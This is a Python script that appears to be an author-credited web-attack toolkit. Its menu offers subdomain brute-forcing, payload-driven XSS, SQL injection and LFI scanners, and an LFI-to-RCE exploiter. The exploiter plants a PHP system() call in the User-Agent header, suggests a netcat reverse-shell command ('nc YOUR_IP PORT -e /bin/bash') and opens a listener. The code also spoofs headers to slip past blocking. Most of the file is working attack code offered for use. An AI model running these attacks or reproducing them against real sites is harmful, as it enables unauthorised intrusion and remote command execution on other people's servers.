#!/bin/python3
import requests
import socket
import urllib.parse
import fake_headers
import time
import re
import concurrent.futures
import getpass
import sys
import requests.packages.urllib3.exceptions
import os
import json
import pathlib
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning)

Black = '\u001b[30m'
Red = '\u001b[31m'
Green = '\u001b[32m'
Yellow = '\u001b[33m'
Blue = '\u001b[34m'
Magenta = '\u001b[35m'
Cyan = '\u001b[36m'
White = '\u001b[37m'
Reset = '\u001b[0m'

def look_up(ip:str):
    ip=socket.gethostbyname(ip)
    print('{Reset}IP has been resolved to {ip}'.format(Reset=Reset,ip=ip))
    whois=os.popen('whois {ip}'.format(ip=ip)).read()
    if len(whois) != 0: # correct
        print(f'{Green}{whois}')
    else:
        print('Not Found on the system trying to install whois')
        os.system('sudo apt install whois')
def sub_enum(main_domain: str):  # Subdomain Enumiration
    try:
        # First of all we need to Check if the given url Syntax is Right
        parsed = urllib.parse.urlparse(main_domain)
        headerz = fake_headers.Headers(os='linux')
        if not parsed.scheme:
            parsed = 'http://'+main_domain  # add scheme
        else:
            parsed = main_domain
        # send request to get HTML content , 60 for timeout with fake headers in order to Bypass Block Via User-Agent
        request = requests.get(parsed, verify=False,
                               timeout=60, headers=headerz.generate())
        if request.status_code >= 200 and request.status_code < 400 and request.status_code != 404:
            print(f'{parsed} {Blue}:{Green}{request.status_code}')
        else:
            pass
    except KeyboardInterrupt:
        print('exitting')
        exit(0)
    except requests.exceptions.ConnectionError:
        pass
def xss(url: str,cookie):
    parse=urllib.parse.urlparse(url)
    if not parse.scheme:
        url='http://'+url
    else:
        url=url
    if "HERE" not in url:
        print(f'Error:{Green}\'HERE\'{Reset} Must be in url(Replace in the Injectable param Value)')
        exit()
    if cookie != "":
        try:
            cookie=json.loads(cookie)
        except json.decoder.JSONDecodeError:
            print(f'{Red}Error:Invalid Cookies Syntax.\n')
            exit(0)
    else:
        cookie={}
    try:
        for i in f'{Red}Started .....\n':
            sys.stdout.write(i)
            sys.stdout.flush()
            time.sleep(0.01)
        payloads = []
        worked = []
        read_p = open(str(pathlib.Path(__file__).parent.absolute())+'/xss.txt', mode='r')  # read XSS Payloads from list
        for o in read_p:
            o = o.rstrip('\n')
            payloads.append(o)  # add to payloads list
        head = fake_headers.Headers(browser='firefox', os='linux')
        for payload in payloads:
            new_url = url.replace("HERE",payload)
            request = requests.get(new_url, verify=False,headers=head.generate(),cookies=cookie)
            if payload in str(request.content):
                print(f'{Green}[!] Vuln Found : {new_url}')
                worked.append(payload)
            else:
                # Do Nothing (Don't Print Not_Injected/Filtered On Terminal)
                pass
        print('{0} Of Total {1} Payloads Injected'.format(
            len(worked), len(payloads)))
    except KeyboardInterrupt:
        exit(1)
def sqli(url: str,cookie:str):
    parse=urllib.parse.urlparse(url)
    if not parse.scheme:
        url='http://'+url
    else:
        url=url
    if "HERE" not in url:
        print(f'Error:{Green}\'HERE\'{Reset} Must be in url(Replace in the Injectable param Value)')
        exit()
    if cookie != "":
        try:
            cookie=json.loads(cookie)
        except json.decoder.JSONDecodeError:
            print(f'{Red}Error:Invalid Cookies Syntax.\n')
            exit(0)
    else:
        cookie={}
    try:
        print('SQLI Scanner ...')
        payload = open(str(pathlib.Path(__file__).parent.absolute())+'/MySQL_MSSQL.txt',mode='r') # read Payloads from file Inspired from Github
        for payl in payload:
            payl=payl.rstrip('\n')
            url = str(url.replace('HERE',str(payl)))
            request = requests.get(url, verify=False,cookies=cookie)
            if ('<b>Warning</b>' in str(request.content) or 'unrecognized token:' in str(request.content) or 'Unable to prepare statement:' in str(request.content) or 'You have an error in your SQL' in str(request.content) or 'ERROR:  syntax error' in str(request.content)
            or "MySQL server version for the right syntax" in str(request.content) or "supplied argument is not a valid MySQL result resource" in str(request.content) or "Warning: mysql_" in str(request.content) or "Unknown column" in str(request.content)):
                print(f'{Green}[!] VULN FOUND:{Red}{url}')
            else:
                #print(proof)
                pass
    except:
        pass
def lfi_scanner(url:str,cookie):
    parse=urllib.parse.urlparse(url)
    if not parse.scheme:
        url='http://'+url
    else:
        url=url
    if "HERE" not in url:
        print(f'Error:{Green}\'HERE\'{Reset} Must be in url(Replace in the Injectable param Value)')
        exit()
    if cookie != "":
        try:
            cookie=json.loads(cookie)
        except json.decoder.JSONDecodeError:
            print(f'{Red}Error:Invalid Cookies Syntax.\n')
            exit(0)
    else:
        cookie={}
    ################### Detection ###################
    try : 
        payloads=open(str(pathlib.Path(__file__).parent.absolute())+'/pathtotest_huge.txt',mode='r') # payloads wordlist Inspired From github
        executed = ['root:x','_ROOT','root','ROOT']
        for payload in payloads:
            payload=payload.rstrip('\n')
            r=requests.get(url.replace('HERE',str(payload)),cookies=cookie,verify=False)
            #print(r.url)
            for execute in executed:
                if execute in str(r.content) : 
                    print(f'{Green}[!] VULN FOUND :{Red} {url.replace("HERE",payload)}')
                else :
                    pass
    except KeyboardInterrupt:
        exit(0)
def lfi_exploiter(url:str,cookie,port):
    parse=urllib.parse.urlparse(url)
    if not parse.scheme:
        url='http://'+url
    else:
        url=url
    if "HERE" not in url:
        print(f'Error:{Green}\'HERE\'{Reset} Must be in url(Replace in the Injectable param Value)')
        exit()
    if cookie != "":
        try:
            cookie=json.loads(cookie)
        except json.decoder.JSONDecodeError:
            print(f'{Red}Error:Invalid Cookies Syntax.\n')
            exit(0)
    else:
        cookie={}
    #######################Explitation#####################
    # Inspired From["https://www.exploit-db.com/papers/12886",
    # By Reading the Public Exploit above we can know User-Agent is where to Inject Commands so let's do it 
    # and I Will use netcat , or wget for shell if user wants so I will let command as user's choice]
    #PHP://Filter Is Second
    try : 
        # first thing we will try exploiting /proc/self/environ # Depends On Netcat , :) 
        command=input("[+] command ex(nc YOUR_IP PORT -e /bin/bash): ")
        print('netcat will be used to listen')
        ua={"User-Agent":"<?system('sleep 15 && {}');?>".format(command)}
        print('Trying Exploit /proc/self/environ')
        r=requests.get(url.replace("HERE","/proc/self/environ"),verify=False,cookies=cookie,headers=ua)
        print('Response : ',r.status_code)
        shell_=input("Do You Want To open Listener(NetCat)?[Y/n]:")
        if 'y' in shell_.lower():
            os.popen('nc -nlvp {}'.format(port)) # Open Listener
        else:
            exit(0) # Maybe User Have other Listener 
    except:
        pass
def main():
    print(f'''{Yellow}
[{Red}0{Yellow}] {Magenta}Gathering Subdomains{Yellow}
[{Red}1{Yellow}] {Magenta}Scan For XSS{Yellow}
[{Red}2{Yellow}] {Magenta}Scan For SQLI (Non-Blind){Yellow}
[{Red}3{Yellow}] {Magenta}WhoisLookup{Yellow}
[{Red}4{Yellow}] {Magenta}Scan For LFI{Yellow}
[{Red}5{Yellow}] {Magenta}exploit LFI To RCE (Based On /proc/self/environ){Yellow}
[{Red}99{Yellow}] {Red}Exit
{Reset}
''')
    regex = re.compile('[0-9]*.([0-9])?')
    choice = input(f'{Yellow}{getpass.getuser()}{Blue}@{Green}Shell--->')
    print(f'{Reset}')
    if choice.lower() == '0':
        # main domain
        main_ = input(
            f'{Yellow}Enter Main Domain(without www. ex:google.com):{Green} ')
        # Open Lista
        lista = open(str(pathlib.Path(__file__).parent.absolute())+'/brute/names.txt', mode='r')
        duration = time.time()  # Start Time
        for sub in lista:
            sub = sub.rstrip('\n')  # Remove \n
            sub = sub+'.'+main_  # Gather The whole URL
            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executer:
                executer.submit(sub_enum,sub)
        print(
            f'{Blue}Finished {Red}@ {Yellow}{time.asctime()} [{regex.search(str(duration-time.time())).group()}] {Reset}')
        main()
    elif choice.lower() == '1':
        print('XSS Scanner')
        xss(input('URL ex:(http://127.0.0.1/x0.php?username=HERE):'),cookie=input('Cookies:{"PHPSESSID":"blabla"}:'))
    elif choice.lower() == '2':
        sqli(input('URL ex:(http://vuln.com/page?id=HERE):'),input('Cookies ex:{"PHPSESSID":"blabla","security":"low"}:'))
    elif choice.lower() == '3':
        look_up(input('Domain ex(google.com):'))
    elif choice.lower() == '4':
        lfi_scanner(input('URL ex http://127.0.0.1/DVWA/vulnerabilities/fi/?page=HERE:'),input('Cookies:{"PHPSESSID":"blabla"}:'))
    elif choice.lower() == '5':
        lfi_exploiter(input('URL ex http://127.0.0.1/DVWA/vulnerabilities/fi/?page=HERE:'),input('Cookies:{"PHPSESSID":"blabla"}:'),input('Port to listen:'))
    elif choice.lower() == '99':
        exit()
    else:
        main()
if __name__ == '__main__':
    print(f"""
        {Red}
  _     ____  _ _  ___    ______   __ ____            _
 | |   |___ \| | |/ _ \  |  ____| /_ |___ \          | |
 | |__   __) | | | | | | | |__ _ __| | __) |_ __   __| |
 | '_ \ |__ <| | | | | | |  __| '__| ||__ <| '_ \ / _` |
 | | | |___) | | | |_| | | |  | |  | |___) | | | | (_| |
 |_| |_|____/|_|_|\___/  |_|  |_|  |_|____/|_| |_|\__,_|
                                                        v1.0
	Coded By : Nayef Hamouda
	Facebook : https://www.facebook.com/nayef.hamoodh
{Reset}""")
    try : 
        main()
    except KeyboardInterrupt:
        print(f"\n{Red}^C Exitting .....{Reset}")
        exit()
